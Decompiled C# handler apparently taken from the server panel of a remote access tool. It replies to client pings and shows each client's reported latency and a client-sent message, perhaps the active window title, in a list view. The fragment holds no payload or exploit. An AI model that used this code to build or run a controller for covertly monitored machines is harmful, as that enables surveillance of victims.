using System;
using System.Drawing;
using System.Threading;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200004F RID: 79
	public class HandlePing
	{
		// Token: 0x060001C7 RID: 455 RVA: 0x00010B1C File Offset: 0x0000ED1C
		public void Ping(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").SetAsString("pong");
				ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), msgPack.Encode2Bytes());
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						client.LV.SubItems[Program.form1.lv_act.Index].Text = unpack_msgpack.ForcePathObject("Message").AsString;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x060001C8 RID: 456 RVA: 0x00010BD8 File Offset: 0x0000EDD8
		public void Pong(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				object lockListviewClients = Settings.LockListviewClients;
				lock (lockListviewClients)
				{
					if (client.LV != null)
					{
						int num = (int)unpack_msgpack.ForcePathObject("Message").AsInteger;
						client.LV.SubItems[Program.form1.lv_ping.Index].Text = num.ToString() + " MS";
						if (num > 400)
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Red;
						}
						else if (num > 200)
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Orange;
						}
						else
						{
							client.LV.SubItems[Program.form1.lv_ping.Index].ForeColor = Color.Green;
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
